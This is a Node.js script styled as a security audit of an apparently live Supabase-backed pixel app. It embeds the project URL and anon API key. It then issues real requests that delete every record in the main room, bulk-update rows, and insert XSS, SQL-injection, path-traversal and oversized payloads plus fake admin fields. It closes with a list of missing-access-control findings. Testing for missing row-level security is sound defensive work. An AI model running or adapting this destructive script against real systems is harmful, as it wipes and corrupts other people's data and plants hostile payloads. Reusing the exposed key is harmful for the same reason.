const https = require('https');
const { URL } = require('url');

// Supabase connection details
const SUPABASE_URL = 'https://xvpaowbxdzoucvlkhnxp.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh2cGFvd2J4ZHpvdWN2bGtobnhwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTMyNjg2NDcsImV4cCI6MjA2ODg0NDY0N30.mpoZFWw3IkNd-8w7j7oMyTl9qcSTe9zwiSv19RO_IUE';

function makeRequest(method, path, data = null) {
    return new Promise((resolve, reject) => {
        const url = new URL(path, SUPABASE_URL);
        
        const options = {
            method,
            headers: {
                'apikey': SUPABASE_ANON_KEY,
                'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
                'Content-Type': 'application/json',
                'Prefer': 'return=representation'
            }
        };

        const req = https.request(url, options, (res) => {
            let responseData = '';
            
            res.on('data', (chunk) => {
                responseData += chunk;
            });
            
            res.on('end', () => {
                try {
                    const parsedData = responseData ? JSON.parse(responseData) : null;
                    resolve({
                        statusCode: res.statusCode,
                        headers: res.headers,
                        data: parsedData
                    });
                } catch (e) {
                    resolve({
                        statusCode: res.statusCode,
                        headers: res.headers,
                        data: responseData
                    });
                }
            });
        });

        req.on('error', (error) => {
            reject(error);
        });

        if (data) {
            req.write(JSON.stringify(data));
        }

        req.end();
    });
}

async function finalSecurityTest() {
    console.log('=== FINAL CRITICAL SECURITY TESTS ===\n');

    // Test bulk deletion capability
    console.log('1. Testing bulk deletion capabilities...');
    
    // First, let's see current record count
    try {
        const countBefore = await makeRequest('GET', '/rest/v1/pixels?select=count');
        const totalRecords = countBefore.data[0].count;
        console.log(`  Current total records: ${totalRecords}`);
        
        // Test if we can delete all records with a simple condition
        console.log('  Testing if we can delete ALL records...');
        const deleteAllTest = await makeRequest('DELETE', '/rest/v1/pixels?room=eq.pixel-room');
        console.log(`  DELETE all from main room result: Status ${deleteAllTest.statusCode}`);
        
        if (deleteAllTest.statusCode === 200 || deleteAllTest.statusCode === 204) {
            console.log('  🚨 CATASTROPHIC: Can delete all records from main room!');
            
            // Check how many records remain
            const countAfter = await makeRequest('GET', '/rest/v1/pixels?select=count');
            const remainingRecords = countAfter.data[0].count;
            console.log(`  Records remaining: ${remainingRecords} (deleted: ${totalRecords - remainingRecords})`);
        }
        
    } catch (error) {
        console.log(`  Bulk deletion test failed: ${error.message}`);
    }

    // Test bulk update capability
    console.log('\n2. Testing bulk update capabilities...');
    
    try {
        const bulkUpdateTest = await makeRequest('PATCH', '/rest/v1/pixels?room=eq.security-test-room', {
            color: '#BULK_UPDATED',
            author: 'security-auditor'
        });
        
        console.log(`  Bulk update test: Status ${bulkUpdateTest.statusCode}`);
        
        if (bulkUpdateTest.statusCode === 200 || bulkUpdateTest.statusCode === 204) {
            console.log('  ⚠️ Can perform bulk updates');
            
            // Check how many were affected
            const updatedCount = await makeRequest('GET', '/rest/v1/pixels?color=eq.%23BULK_UPDATED&select=count');
            if (updatedCount.data && updatedCount.data[0]) {
                console.log(`  Records bulk updated: ${updatedCount.data[0].count}`);
            }
        }
        
    } catch (error) {
        console.log(`  Bulk update test failed: ${error.message}`);
    }

    // Test if we can inject malicious data
    console.log('\n3. Testing malicious data injection...');
    
    const maliciousPayloads = [
        { color: '<script>alert("XSS")</script>', author: 'xss-test' },
        { color: '"; DROP TABLE pixels; --', author: 'sql-injection' },
        { room: '../../../etc/passwd', color: '#PATH_TRAVERSAL', author: 'path-test' },
        { author: 'A'.repeat(10000), color: '#OVERFLOW_TEST' }, // Test for buffer overflow
    ];

    for (let i = 0; i < maliciousPayloads.length; i++) {
        try {
            const payload = {
                room: 'security-test-room',
                x: 9000 + i,
                y: 9000 + i,
                timestamp: new Date().toISOString(),
                ...maliciousPayloads[i]
            };
            
            const maliciousTest = await makeRequest('POST', '/rest/v1/pixels', payload);
            
            if (maliciousTest.statusCode === 201) {
                console.log(`  ⚠️ Malicious payload ${i + 1} accepted (Status: ${maliciousTest.statusCode})`);
                console.log(`    Payload type: ${Object.keys(maliciousPayloads[i]).join(', ')}`);
            }
            
        } catch (error) {
            console.log(`  Malicious payload ${i + 1} failed: ${error.message}`);
        }
    }

    // Test for privilege escalation
    console.log('\n4. Testing privilege escalation attempts...');
    
    try {
        // Try to create a record with administrative-looking fields
        const adminTest = await makeRequest('POST', '/rest/v1/pixels', {
            room: 'admin-room',
            x: 0,
            y: 0,
            color: '#ADMIN',
            author: 'admin',
            is_admin: true,
            role: 'administrator',
            permissions: ['all'],
            created_at: new Date().toISOString(),
            updated_at: new Date().toISOString()
        });
        
        console.log(`  Admin privilege test: Status ${adminTest.statusCode}`);
        
        if (adminTest.statusCode === 201) {
            console.log('  ⚠️ Can create records with admin-like fields');
        }
        
    } catch (error) {
        console.log(`  Privilege escalation test failed: ${error.message}`);
    }

    // Final summary
    console.log('\n5. Generating final security summary...');
    
    try {
        const finalCount = await makeRequest('GET', '/rest/v1/pixels?select=count');
        const totalRecords = finalCount.data[0].count;
        console.log(`  Final record count: ${totalRecords}`);
        
        // Sample recent records to see what damage was done
        const recentRecords = await makeRequest('GET', '/rest/v1/pixels?order=timestamp.desc&limit=5');
        console.log('  Most recent records:');
        
        if (recentRecords.data) {
            recentRecords.data.forEach((record, index) => {
                console.log(`    ${index + 1}. Room: ${record.room}, Author: ${record.author}, Color: ${record.color}`);
            });
        }
        
    } catch (error) {
        console.log(`  Final summary failed: ${error.message}`);
    }

    console.log('\n=== SECURITY AUDIT COMPLETE ===');
    console.log('\n🚨 CRITICAL SECURITY FINDINGS SUMMARY:');
    console.log('- Anonymous users can READ all data');
    console.log('- Anonymous users can UPDATE any record');
    console.log('- Anonymous users can DELETE records with broad conditions');
    console.log('- Anonymous users can INSERT arbitrary data');
    console.log('- No Row Level Security policies appear to be active');
    console.log('- Cross-user data modification is possible');
    console.log('- Bulk operations are unrestricted');
    console.log('- No rate limiting detected');
    console.log('- Malicious data injection is possible');
}

finalSecurityTest().catch(console.error);